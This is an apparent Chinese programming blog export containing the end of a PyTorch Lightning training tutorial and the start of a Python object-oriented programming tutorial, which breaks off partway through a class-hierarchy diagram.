当然也可以继承LightningLoggerBase类来自定义Logger，这个自己看官方文档 optimizer 和 lr_scheduler 当然，在训练过程中，对学习率的掌控也是非常重要的，合理设置学习率有利于提高效果，学习率衰减可查看四种学习率衰减方法。那在pytorch_lightning 中如何设置呢？其实跟pytorch是一样的，基本上不需要修改： 123456789101112# 重写configure_optimizers()函数即可# 设置优化器def configure_optimizers(self): weight_decay = 1e-6 # l2正则化系数 # 假如有两个网络，一个encoder一个decoder optimizer = optim.Adam([&#123;&#x27;encoder_params&#x27;: self.encoder.parameters()&#125;, &#123;&#x27;decoder_params&#x27;: self.decoder.parameters()&#125;], lr=learning_rate, weight_decay=weight_decay) # 同样，如果只有一个网络结构，就可以更直接了 optimizer = optim.Adam(my_model.parameters(), lr=learning_rate, weight_decay=weight_decay) # 我这里设置2000个epoch后学习率变为原来的0.5，之后不再改变 StepLR = torch.optim.lr_scheduler.MultiStepLR(optimizer, milestones=[2000], gamma=0.5) optim_dict = &#123;&#x27;optimizer&#x27;: optimizer, &#x27;lr_scheduler&#x27;: StepLR&#125; return optim_dict 这样就OK了，只要在training_step()函数中返回了loss，就会自动反向传播，并自动调用loss.backward()和optimizer.step()和stepLR.step()了 多优化器用于多模型等网络结构 当我们训练的是复杂的网络结构时，可能有多个模型，需要不同的训练顺序，不同的训练学习率等，这时候就需要设计多个优化器，并手动调用梯度反传函数 12345# multiple optimizer case (e.g.: GAN)def configure_optimizers(self): opt_d = Adam(self.model_d.parameters(), lr=0.01) opt_g = Adam(self.model_g.parameters(), lr=0.02) return opt_d, opt_g 然后要关掉自动优化，这样就可以跟pytorch一样手动控制优化器的权重更新了，达到了跟pytorch一样可以进行复杂地更新顺序等地控制，同时pytorch lightning的优势还在，例如多GPU下batchnorm的参数同步等。 12# 在new Trainer对象的时候，把自动优化关掉trainer = Trainer(automatic_optimization=False) 这时候 training_step()函数也就不是直接返回loss 或者 字典了，而是不需要返回loss了，因为在该函数里就手动完成权重更新函数地调用, 另外需要注意的是：1. 不再使用loss.backward()函数，改用self.manual_backward(loss, opt)，就可以实现半精度训练。 2. 忽略optimizer_idx参数。 12345678910111213141516def training_step(self, batch, batch_idx, opt_idx): # 获取在configure_optimizers()中返回的优化器 (opt_d, opt_g) = self.optimizers() loss_g = self.acquire_loss_g() # 注意:不再使用loss.backward(). 另外以GAN为例，因为生成器的动态图还要保持给判别器用于更新，因此retain_graph=True. self.manual_backward(loss_g, opt_g, retain_graph=True) # 销毁动态图 self.manual_backward(loss_g, opt_g) opt_g.step() # 在更新判别器的时候，保存生成器是0梯度的 opt_g.zero_grad() # 更新判别器 loss_d = self.acquire_loss_d() self.manual_backward(loss_d, opt_d) 其他 多GPU训练 如果是CPU训练，在定义Trainer时不管gpus这个参数就可以了，或者设置该参数为0： 1trainer = pl.Trainer(gpus=0) 而多GPU训练，也是很方便，只要将该参数设置为你要用的gpu数就可以，例如用4张GPU： 1trainer = pl.Trainer(gpus=4) 而如果你有很多张GPU，但是要跟同学分别使用，只要在程序最前面设置哪些GPU可用就可以了，例如服务器有4张卡，但是你只能用0和2号卡： 123import osos.environ[&#x27;CUDA_VISIBLE_DEVICES&#x27;] = &#x27;0, 2&#x27;trainer = pl.Trainer(gpus=2) 半精度训练 半精度训练也是Apex的一大特色，可以在几乎不影响效果的情况下降低GPU显存的使用率（大概50%），提高训练速度，现在pytorch_lightning 统统都给你，可以只要设置一下参数就可以： 1trainer = pl.Trainer(precision=16) 累积梯度 默认情况是每个batch 之后都更新一次梯度，当然也可以N个batch后再更新，这样就有了大batch size 更新的效果了，例如当你内存很小，训练的batch size 设置的很小，这时候就可以采用累积梯度： 12# 默认情况下不开启累积梯度trainer = Trainer(accumulate_grad_batches=1) 自动缩放batch_size 这方法还有很多限制，直接trainer.fit(model)是无效的，感觉挺麻烦，不建议用 大的batch_size 通过可以获得更好的梯度估计。但同时也要更长的时间，另外，如果内存满了，电脑会卡住动不了。 'power' – 从batch size 为1 开始翻倍地往上找，例如``1–&gt;2 --&gt; 4 --&gt; …一直到内存溢出(out-of-memory, OOM)；binsearch`也是翻倍地找，直OOM，但是之后还要继续进行一个二叉搜索，找到一个更好的batch size。另外，搜索的batch size 最大不会超过数据集的尺寸。 12345678# 默认不开启trainer = Trainer(auto_scale_batch_size=None)# 自动找满足内存的 batch sizetrainer = Trainer(auto_scale_batch_size=None|&#x27;power&#x27;|&#x27;binsearch&#x27;)# 加载到模型trainer.tune(model) 保存所有超参数到模型中 将所有的模型超参数都保存到模型中，恢复模型时再也不用自己去拖动恢复模型中的超参数了，这点是太有特色了： 1234# 例如你传入的超参数字典为params_dictself.hparams.update(params_dict) # 直接将你的超参数更新到pl模型的超参数字典中# 这样，在保存的时候就会保存超参数了self.save_hyperparameters() 当然，对于无们训练的不同的模型，我们还是需要查看其超参数，可以通过将超参数字典保存到本地txt的方法，来以便后期查看 123456789101112def save_dict_as_txt(list_dict, save_dir): with open(save_dir, &#x27;w&#x27;) as fw: if isinstance(list_dict, list): for dict in list_dict: for key in dict.keys(): fw.writelines(key + &#x27;: &#x27; + str(dict.get(key)) + &#x27;\\n&#x27;) else: for key in list_dict.keys(): fw.writelines(key + &#x27;: &#x27; + str(list_dict.get(key)) + &#x27;\\n&#x27;) fw.close()# 保存超参数字典到txt save_dict_as_txt(self.hparams, save_dir) 梯度剪裁 当需要避免发生梯度爆炸时，可以采用梯度剪裁的方法，这个梯度范数是通过所有的模型权重计算出来的： 12345# 默认不剪裁trainer = Trainer(gradient_clip_val=0)# 梯度范数的上限为0.5trainer = Trainer(gradient_clip_val=0.5) 设置训练的最小和最大epochs 默认最小训练1个epoch，最大训练1000个epoch。 1trainer = Trainer(min_epochs=1, max_epochs=1000) 小数据集 当我们的数据集过大或者当我们进行debug时，不想要加载整个数据集，则可以只加载其中的一小部分： 默认是全部加载，即下面的参数值都为1.0 123456# 参训练集、校验集和测试集分别只加载 10%, 20%, 30%，或者使用int 型表示batchtrainer = Trainer( limit_train_batches=0.1, limit_val_batches=0.2, limit_test_batches=0.3) 其中比较需要注意的是训练集和测试集比例的设置，因为pytorch_lightning 每次validation和test时，都是会计算一个epoch，而不是一个step，因此在训练过程中，如果你的validation dataset比较大，那就会消耗大量的时间在validation上，而我们实际上只是想要知道在训练过程中，模型训练的怎么样了，不需要跑完整个epoch，因此就可以将limit_val_batches设置的小一些。对于test，在训练完成后，如果我们不希望对所有的数据都进行test，也可以通过这个参数来设置。 另外，该框架有个参数num_sanity_val_steps，用于设置在开始训练前先进行num_sanity_val_steps个 batch的validation，以免你训练了一段时间，在校验的时候程序报错，导致浪费时间。该参数在获得trainer的时间传入： 12345678# 默认为2个batch的validationtrainer = Trainer(num_sanity_val_steps=2)# 关闭开始训练前的validaion,直接开始训练trainer = Trainer(num_sanity_val_steps=0)# 把校验集都运行一遍（可能会浪费很多时间）trainer = Trainer(num_sanity_val_steps=-1) PL当前版本的BUG 该框架10月份才推出，有BUG才是正常的，下面给出我遇到的BUG（也有的是自己踩的坑）： 多GPU CUDA设备不同步问题 在进行多GPU训练过程中，当完成一个epoch或者运行到epoch的指定百分比后，会进行validation过程，完成validation后，报了一个错： 1RuntimeError: All input tensors must be on the same device. Received cuda:2 and cuda:0 我在github上发起了一个issue，有人已经修复了这个bug，在后面新版的pytorch_lightning中应该会被修改了，但是如果你用的时候也报这个错，可以通过下面的步骤进行修复： https://github.com/PyTorchLightning/pytorch-lightning/pull/4138/files/b20f383acaac4662caee86b76ec56c5c478f44a0 DataLoader的问题 RuntimeError: DataLoader worker (pid(s) 6700, 10620) exited unexpectedly 这个问题一般是多GPU跑的时候才会出现，主要是加载DataLoader的时候，num_works=0就可以了，另外，我在一个task里，设置的是num_works=8是OK了，但是到了另一个task中，图像更大了，可能是内存不够，加载数据集特别特别特别慢，几乎不动。 如遇到这个报错，减小batch_size，设置num_works=0，在定义trainer的时候，设置 123trainer = pl.Trainer(distributed_backend=&#x27;ddp&#x27;)# ortrainer = pl.Trainer(distributed_backend=&#x27;dp&#x27;) 一键导出模型训练过程中记录的loss 在训练过程当中,我们会用 self.log 函数去把训练的loss 和 校验的loss 等信息保存起来,下面就是我写的代码,一键导出某个训练模型中的所有log 数据,支持一键保存成excel,不同的loss 保存到同一个excel 文件中的不同表格,也提供了将excel 文件保存成 .mat 文件,方便用于matlab 的绘图放到论文中. 不需要 tensorflow, 有 tensorboard 就可以了 烟酒僧：Pytorch-lightning tensorboard导出数据（代码）6 赞同 · 1 评论文章","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"name":"pytorch_lightning","slug":"pytorch-lightning","permalink":"http://enderxiao.github.io/categories/pytorch-lightning/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"pytorch","slug":"pytorch","permalink":"http://enderxiao.github.io/tags/pytorch/"},{"name":"pytorch_lightning","slug":"pytorch-lightning","permalink":"http://enderxiao.github.io/tags/pytorch-lightning/"},{"name":"进阶","slug":"进阶","permalink":"http://enderxiao.github.io/tags/%E8%BF%9B%E9%98%B6/"}]},{"title":"python进阶-OOP","slug":"python进阶-OOP","date":"2021-07-26T03:39:13.000Z","updated":"2024-07-30T11:26:33.919Z","comments":true,"path":"2021/07/26/python进阶-OOP/","permalink":"http://enderxiao.github.io/2021/07/26/python%E8%BF%9B%E9%98%B6-OOP/","excerpt":"python学习笔记，面对对象部分","text":"python学习笔记，面对对象部分 OOP 作为长期使用C++，java进行开发的程序员老说，OOP可以说是一种比较情切的程序设计思想了，所谓万物皆对象。 在python，几乎所有数据类型都可视为对象，甚至函数，python同样支持自定义对象。 模块 在了解python中实现OOP之前，先来描述一下模块的概念，如下是一个自定义模块的样子： 12345678910111213141516171819202122#!/usr/bin/env python3# -*- coding: utf-8 -*-&#x27; a test module &#x27;__author__ = &#x27;Ender&#x27;# 以上是模块的文档规范import sysdef test(): args = sys.argv if len(args)==1: print(&#x27;Hello, world!&#x27;) elif len(args)==2: print(&#x27;Hello, %s!&#x27; % args[1]) else: print(&#x27;Too many arguments!&#x27;)if __name__==&#x27;__main__&#x27;: test() 第10行中，在导入sys模块后，变量sys就指向了该模块，此后便可通过该变量访问这个模块中的功能。 例如第13行的argv变量，就是该模块中用于存储命令行中参数的list，argv中至少包含一个元素，即.py文件的名称。 例如使用如下命令调用时： 1python3 hello.py Ender argv中的参数就是： 1[&#x27;hello.py&#x27;, &#x27;Michael&#x27;] 当我们在命令行运行hello模块文件时，python解释器把一个特殊的变量__name__置为__main__，而如果在其他地方导入该hello模块时，if判断将失败。因此，这种if测试可以让一个模块通过命令行运行时执行一些额外的代码，最常见的用途就是运行测试。 例如使用命令行运行hello.py 1234&gt;&gt;&gt; python3 hello.pyHello, world!&gt;&gt;&gt; python hello.py EnderHello, Ender! 而导入hello模块时，不会打印任何东西，原因是没有调用test函数： 1234&gt;&gt;&gt; python&gt;&gt;&gt; import hello&gt;&gt;&gt; hello.text()&gt;&gt;&gt; Hello, world! 模块内作用域 Python中没有严格的作用域限定方式，只能依靠某些特定的命名方式以及约定俗称来限定模块间对象的访问规则： 能够被外部访问的模块内对象只能以字母开头 特殊对象，如声明作者，调用判断，文档说明等，均以__开头以及结尾，如__author__, __name__, __doc__ 非公开变量需要使用下划线开头，例如_xxx, __xxx，这样的对象不应该被直接引用。 类 接下来我们看一些python中的相关操作。 Python中定义类通过class关键字 12class Student(object): pass class后面紧接着是类名，即Student，类名通常是大写开头的单词，紧接着是(object)，表示该类是从哪个类继承下来的，继承的概念我们后面再讲，通常，如果没有合适的继承类，就使用object类，这是所有类最终都会继承的类。 实例化则通过如下方式： 12345&gt;&gt;&gt; bart = Student()&gt;&gt;&gt; bart&lt;__main__.Student object at 0x10a67a590&gt;&gt;&gt;&gt; Student&lt;class &#x27;__main__.Student&#x27;&gt; 创建实例后，可以为某一单独实例绑定属性： 123&gt;&gt;&gt; bart.name = &#x27;Bart Simpson&#x27;&gt;&gt;&gt; bart.name&#x27;Bart Simpson&#x27; 而为类绑定属性，则需要使用一个特殊的方法：__init__： 1234class Student(object): def __init__(self, name, score): self.name = name self.score = score 其中第一个参数self表示创建的实例本身，因此在该函数内会将各种属性绑定到self即self所指的实例。 12345&gt;&gt;&gt; bart = Student(&#x27;Bart Simpson&#x27;, 59)&gt;&gt;&gt; bart.name&#x27;Bart Simpson&#x27;&gt;&gt;&gt; bart.score59 可见实例本身不用显式的传入实例。 为类创建方法： 12345678class Student(object): def __init__(self, name, score): self.name = name self.score = score def print_score(self): print(&#x27;%s: %s&#x27; % (self.name, self.score)) 调用时直接使用： 12&gt;&gt;&gt; bart.print_score()Bart Simpson: 59 可见self也不需要显示的传入 访问限制 有时为了更好的封装某个类，我们通常会对类中的变量进行访问权限的限制。在python中，没有特定的访问限制关键字，而是通过特殊的变量名进行限制。 如果要让内部属性不被外部访问，可以把属性的名称前加上两个下划线__，在Python中，实例的变量名如果以__开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问，例如： 12345678class Student(object): def __init__(self, name, score): self.__name = name self.__score = score def print_score(self): print(&#x27;%s: %s&#x27; % (self.__name, self.__score)) 再次访问将得到如下结果： 12345&gt;&gt;&gt; bart = Student(&#x27;Bart Simpson&#x27;, 59)&gt;&gt;&gt; bart.__nameTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &#x27;Student&#x27; object has no attribute &#x27;__name&#x27; 此时可以通过为私有变量增加get和set方法创建接口来访问他们。 还需要注意的是，在Python中，变量名类似__xxx__的，也就是以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，不是private变量，所以，不能用__name__、__score__这样的变量名。 而有些时候，你会看到以一个下划线开头的实例变量名，比如_name，这样的实例变量外部是可以访问的，但是，按照约定俗成的规定，当你看到这样的变量时，意思就是，“虽然我可以被访问，但是，请把我视为私有变量，不要随意访问”。 而模块中讲到，python中作用域限定通常依靠约定俗称。其实是类中的访问权限限制也是如此。 不能直接访问__name是因为Python解释器对外把__name变量改成了_Student__name，所以，仍然可以通过_Student__name来访问__name变量： 12&gt;&gt;&gt; bart._Student__name&#x27;Bart Simpson&#x27; 但不同版本的Python解释器可能会把__name改成不同的变量名。 另外，在修改操作上，Python的访问限制也没有达到理想效果： 123456&gt;&gt;&gt; bart = Student(&#x27;Bart Simpson&#x27;, 59)&gt;&gt;&gt; bart.get_name()&#x27;Bart Simpson&#x27;&gt;&gt;&gt; bart.__name = &#x27;New Name&#x27; # 设置__name变量！&gt;&gt;&gt; bart.__name&#x27;New Name&#x27; 表面上看，外部代码“成功”地设置了__name变量，但实际上这个__name变量和class内部的__name变量不是一个变量！内部的__name变量已经被Python解释器自动改成了_Student__name，而外部代码给bart新增了一个__name变量： 12&gt;&gt;&gt; bart.get_name() # get_name()内部返回self.__name&#x27;Bart Simpson&#x27; 继承与多态 在类的章节有讲到python中继承的方式： 12345Class Animal(object): def run(self): print(&#x27;Animal is running...&#x27;) def Introduce(self): print(&#x27;I\\&#x27;m an animal&#x27;) 如上类就是继承了object类的一个Animal类，我们可以继续编写它的子类： 12345678910111213class Dog(Animal): def run(self): print(&#x27;Dog is running...&#x27;) def eat(self): print(&#x27;Eating meat...&#x27;)class Cat(Animal): def run(self): print(&#x27;Cat is running...&#x27;) def eat(self): print(&#x27;Eating Fish...&#x27;) 可见Dog和Cat类继承了Animal的方法，并且在其中重写了run方法 Python中创建一个类，实际上是定义了一种新的数据类型，也就意味着： 12345678a = list()b = Animal()c = Dog()isinstance(a, list) # Trueisinstance(b, Animal) # Trueisinstance(c, Dog) # Trueisinstance(c, Animal) # True 可见c即是Dog也是Animal，那么如下操作也是合法的： 1234567def running(animal): animal.run()running(Animal()) # Animal is runningrunning(Dog()) # Dog is runningrunning(Cat()) # Cat is running 可见Dog与Cat的实例能够被接受且均能调用run()方法。 这样的特性能够让我们很方便的实现**“开闭”原则**即： 对扩展开放：允许新增Animal子类 对修改封闭：不需要修改以来Animal类型的running等函数 静态语言与动态语言 上面的例子中的running函数看起来是用了一个Animal类型的变量接受了参数，但由于Python是动态语言，实际上传入running函数前，编辑器并不知道将传入的是个怎样的类型，这就意味着，只要我们传入的参数包含run方法，那么代码就能正常运行，例如： 12345class Timer(object): def run(self): print(&#x27;Start...&#x27;)running(Timer()) # &#x27;Start...&#x27; 而在Java和C++中，这样的参数传入是不被允许的。 这就是动态语言中的鸭子类型，它并不要求严格的继承体系，所谓一个对象只要“看起来像鸭子，走起路来像鸭子”，那它就可以被看做是鸭子。 Python的“file-like object“就是一种鸭子类型。对真正的文件对象，它有一个read()方法，返回其内容。但是，许多对象，只要有read()方法，都被视为“file-like object“。许多函数接收的参数就是“file-like object“，你不一定要传入真正的文件对象，完全可以传入任何实现了read()方法的对象。 获取对象信息 当我们拿到一个实例对象时，有两种方法可以确定他们的类： type() instance() type 1234567891011121314151617181920&gt;&gt;&gt; type(123)&lt;class &#x27;int&#x27;&gt;&gt;&gt;&gt; type(&#x27;str&#x27;)&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; type(None)&lt;type(None) &#x27;NoneType&#x27;&gt;&gt;&gt;&gt; type(abs)&lt;class &#x27;builtin_function_or_method&#x27;&gt;&gt;&gt;&gt; type(a)&lt;class &#x27;__main__.Animal&#x27;&gt;&gt;&gt;&gt; type(123)==type(456)True&gt;&gt;&gt; type(123)==intTrue&gt;&gt;&gt; type(&#x27;abc&#x27;)==type(&#x27;123&#x27;)True&gt;&gt;&gt; type(&#x27;abc&#x27;)==strTrue&gt;&gt;&gt; type(&#x27;abc&#x27;)==type(123)False 如果需要判断一个对象是否是函数，则需要使用types模块： 123456789101112&gt;&gt;&gt; import types&gt;&gt;&gt; def fn():... pass...&gt;&gt;&gt; type(fn)==types.FunctionTypeTrue&gt;&gt;&gt; type(abs)==types.BuiltinFunctionTypeTrue&gt;&gt;&gt; type(lambda x: x)==types.LambdaTypeTrue&gt;&gt;&gt; type((x for x in range(10)))==types.GeneratorTypeTrue instance type获取类型较为方便，但是对于继承关系来说，就没有那么方便了，此时需要用到instance，例如对于如下继承链： 1object -&gt; Animal -&gt; Dog -&gt; Husky 1234567891011121314151617181920212223&gt;&gt;&gt; a = Animal()&gt;&gt;&gt; d = Dog()&gt;&gt;&gt; h = Husky()&gt;&gt;&gt; isinstance(h, Husky)True&gt;&gt;&gt; isinstance(h, Dog)True&gt;&gt;&gt; isinstance(h, Animal)True&gt;&gt;&gt; isinstance(d, Dog) and isinstance(d, Animal)True&gt;&gt;&gt; isinstance(d, Husky)False&gt;&gt;&gt; isinstance(&#x27;a&#x27;, str)True&gt;&gt;&gt; isinstance(123, int)True&gt;&gt;&gt; isinstance(b&#x27;a&#x27;, bytes)True&gt;&gt;&gt; isinstance([1, 2, 3], (list, tuple))True&gt;&gt;&gt; isinstance((1, 2, 3), (list, tuple))True 总是优先使用isinstance()判断类型，可以将指定类型及其子类“一网打尽”。 获取对象属性 如果想要获取一个对象的所有属性和方法，可以使用dir()函数，它将返回一个包含该对象的所有属性名的字符串list 12&gt;&gt;&gt; dir(&#x27;ABC&#x27;)[&#x27;__add__&#x27;, &#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__getnewargs__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__iter__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__mod__&#x27;, &#x27;__mul__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__rmod__&#x27;, &#x27;__rmul__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;capitalize&#x27;, &#x27;casefold&#x27;, &#x27;center&#x27;, &#x27;count&#x27;, &#x27;encode&#x27;, &#x27;endswith&#x27;, &#x27;expandtabs&#x27;, &#x27;find&#x27;, &#x27;format&#x27;, &#x27;format_map&#x27;, &#x27;index&#x27;, &#x27;isalnum&#x27;, &#x27;isalpha&#x27;, &#x27;isascii&#x27;, &#x27;isdecimal&#x27;, &#x27;isdigit&#x27;, &#x27;isidentifier&#x27;, &#x27;islower&#x27;, &#x27;isnumeric&#x27;, &#x27;isprintable&#x27;, &#x27;isspace&#x27;, &#x27;istitle&#x27;, &#x27;isupper&#x27;, &#x27;join&#x27;, &#x27;ljust&#x27;, &#x27;lower&#x27;, &#x27;lstrip&#x27;, &#x27;maketrans&#x27;, &#x27;partition&#x27;, &#x27;removeprefix&#x27;, &#x27;removesuffix&#x27;, &#x27;replace&#x27;, &#x27;rfind&#x27;, &#x27;rindex&#x27;, &#x27;rjust&#x27;, &#x27;rpartition&#x27;, &#x27;rsplit&#x27;, &#x27;rstrip&#x27;, &#x27;split&#x27;, &#x27;splitlines&#x27;, &#x27;startswith&#x27;, &#x27;strip&#x27;, &#x27;swapcase&#x27;, &#x27;title&#x27;, &#x27;translate&#x27;, &#x27;upper&#x27;, &#x27;zfill&#x27;] 其中类似__len__的方法再python中是有特殊用途的，如果调用len()函数试图获取一个对象的长度，实际上，在len()函数试图获取一个对象的长度，实际上，在len()函数内部是去调用该对象的__len__()方法，所以以下两行代码是等价的： 1234&gt;&gt;&gt; len(&#x27;ABC&#x27;)3&gt;&gt;&gt; &#x27;ABC&#x27;.__len__()3 这就意味着自定义类如果也想通过len函数获取长度，则只需要在我们自定义的类中实现__len__()方法即可： 123456class MyDog(object): def __len__(self): retrun 100dog = MyDog()len(dog) # 100 此外配合getattr()，setattr()，hasattr()，可以直接操作一个对象的状态： 12345678910111213class MyObject(object): def __init__(self): self.x = 9 def power(self): return self.x * self.x obj = MyObject()hasattr(obj,&#x27;x&#x27;) # True 有属性xhasattr(obj,&#x27;y&#x27;) # False 没有属性ysetattr(obj,&#x27;y&#x27;,19) # 设置一个属性yhasattr(obj,&#x27;y&#x27;) # True 有属性ygetattr(obj,&#x27;y&#x27;) # 19 获取属性y 如果获取一个没有的属性，则会报如下错误： 1234&gt;&gt;&gt; getattr(obj, &#x27;z&#x27;) # 获取属性&#x27;z&#x27;Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &#x27;MyObject&#x27; object has no attribute &#x27;z&#x27; getattr()还支持自定义错误返回值： 12&gt;&gt;&gt; getattr(obj, &#x27;z&#x27;, 404) # 获取属性&#x27;z&#x27;，如果不存在，返回默认值404404 此外，对象的方法也是可以操作的： 12345678&gt;&gt;&gt; hasattr(obj, &#x27;power&#x27;) # 有属性&#x27;power&#x27;吗？True&gt;&gt;&gt; getattr(obj, &#x27;power&#x27;) # 获取属性&#x27;power&#x27;&lt;bound method MyObject.power of &lt;__main__.MyObject object at 0x10077a6a0&gt;&gt;&gt;&gt;&gt; fn = getattr(obj, &#x27;power&#x27;) # 获取属性&#x27;power&#x27;并赋值到变量fn&gt;&gt;&gt; fn # fn指向obj.power&lt;bound method MyObject.power of &lt;__main__.MyObject object at 0x10077a6a0&gt;&gt;&gt;&gt;&gt; fn() # 调用fn()与调用obj.power()是一样的 这些操作在不确定自己获得的是一个怎样的对象时会派上用场： 1234def readImage(fp): if hasattr(fp, &#x27;read&#x27;): return readData(fp) return None 实例属性和类属性 python中类的属性有实例属性与类属性的区别 实例属性是，在创建实例时，为每个实例都增加上的属性，操作如下： 123456class Student(object): def __init__(self, name): self.name = names = Student(&#x27;Bob&#x27;)s.score = 90 而类属性则是为类绑定的属性： 12class Student(object): name = &#x27;Student&#x27; 这样的属性我们不实例化也可以访问到： 12345678910111213&gt;&gt;&gt; Student.nameStudent&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.nameStudent&gt;&gt;&gt; s.name = &quot;Michael&quot;&gt;&gt;&gt; s.nameMichael&gt;&gt;&gt; Student.nameStudent&gt;&gt;&gt; del s.name&gt;&gt;&gt; s.nameStudent 可以看到，在类和对象具有同名属性时，我们访问对象的该属性，优先访问到的是实例属性，因此不要对实例属性和类属性使用相同的名字，因为相同名称的实例属性将屏蔽掉类属性。 属性绑定 由于Python动态语言的特性，Python可以轻松实现在允许过程中对类进行操作，比如可以很轻松的为类绑定方法与属性： 12class Student(object): pass 1234&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.name = &#x27;Michael&#x27; # 动态给实例绑定一个属性&gt;&gt;&gt; print(s.name)Michael 绑定方法需要用到types库： 12345678&gt;&gt;&gt; def set_age(self, age): # 定义一个函数作为实例方法... self.age = age...&gt;&gt;&gt; from types import MethodType&gt;&gt;&gt; s.set_age = MethodType(set_age, s) # 给实例绑定一个方法&gt;&gt;&gt; s.set_age(25) # 调用实例方法&gt;&gt;&gt; s.age # 测试结果25 与属性相同，为特定对象绑定的方法无法在另一对象或类中使用，需要为类绑定方法才能让所有对象均可使用 __slots__ python还提供了一种可以限制运行时绑定的属性的操作，比如只允许动态的为Student实例添加name和age属性，此时就可以用到__slots__变量： 12class Student(object): __slots__ = (&#x27;name&#x27;, &#x27;age&#x27;) # 用tuple定义允许绑定的属性名称 然后尝试为其绑定属性： 1234567&gt;&gt;&gt; s = Student() # 创建新的实例&gt;&gt;&gt; s.name = &#x27;Michael&#x27; # 绑定属性&#x27;name&#x27;&gt;&gt;&gt; s.age = 25 # 绑定属性&#x27;age&#x27;&gt;&gt;&gt; s.score = 99 # 绑定属性&#x27;score&#x27;Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &#x27;Student&#x27; object has no attribute &#x27;score&#x27; 可见由于score没有被__slots__指明，因此绑定此属性时报错。 但__slots__定义的属性仅对当前类实例起作用，对继承的子类是不起作用的： 12345&gt;&gt;&gt; class GraduateStudent(Student):... pass...&gt;&gt;&gt; g = GraduateStudent()&gt;&gt;&gt; g.score = 9999 除非在子类中也定义__slots__，这样，子类实例允许定义的属性就是自身的__slots__加上父类的__slots__。 @property 在进行面向对象编程时，我们为了代码的健壮性，通常会对某个类的属性操作进行封装，让这些属性变成私有属性，然后通过对外暴露getter和setter方法来操作这些属性，这样我们在修改和访问这些属性时，就能增加一些类似类型检测，安全检测等诸如此类的操作。 通常我们可以这样写： 1234567891011class Student(object): def get_score(self): return self._score def set_score(self, value): if not isinstance(value, int): raise ValueError(&#x27;score must be an integer!&#x27;) if value &lt; 0 or value &gt; 100: raise ValueError(&#x27;score must between 0 ~ 100!&#x27;) self._score = value 修改和查询score属性时，我们需要这样做： 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.set_score(60) # ok!&gt;&gt;&gt; s.get_score()60&gt;&gt;&gt; s.set_score(9999)Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 访问score属性时，我们需要通过get_score函数进行访问。 python为我们提供了更为直观的访问方法，可以直接通过s.score进行访问和修改，并且还能实现如上的安全检测功能，这就是@property语法糖： 12345678910111213class Student(object): @property def score(self): return self._score @score.setter def score(self, value): if not isinstance(value, int): raise ValueError(&#x27;score must be an integer!&#x27;) if value &lt; 0 or value &gt; 100: raise ValueError(&#x27;score must between 0 ~ 100!&#x27;) self._score = value 把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@score.setter，负责把一个setter方法变成属性赋值，于是，我们就拥有一个可控的属性操作： 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.score = 60 # OK，实际转化为s.set_score(60)&gt;&gt;&gt; s.score # OK，实际转化为s.get_score()60&gt;&gt;&gt; s.score = 9999Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 还可以实现对属性的只读访问： 12345678910111213class Student(object): @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2021 - self._birth 上面的age属性并没有设置setter方法，因此感官上来说是不能对其进行修改操作。 需要特别注意的是： 属性的方法名和实例变量名不能一样 看如下例子： 123456class Student(object): # 方法名称和实例变量均为birth: @property def birth(self): return self.birth 这时如果我们调用s.birth，首先执行上方定义的方法，在执行到return self.birth，又视为调用了对象s的score属性，于是又转到birth方法，形成无限层递归，由于没有对尾递归进行优化，最终将报栈溢出错误RecursionError MixIn Python中的类是支持多继承的，而MixIn设计思路是Python中为了更好的实现Python多继承的设计思路。 现在我们需要为如下几种动物创建类： Dog - 狗勾🐕 Bat - 蝙蝠🦇 Parrot - 鹦鹉🦜 Ostrich - 鸵鸟🦩 如果我们想要将 1234567891011121314151617181920212223 ┌───────────────┐ │ Animal │ └───────────────┘ │ ┌────────────┴────────────┐ │ │ ▼ ▼ ┌─────────────┐ ┌─────────────┐ │ Mammal │ │ Bird │ └─────────────┘ └─────────────┘ │ │ ┌─────┴──────┐ ┌─────┴──────┐ 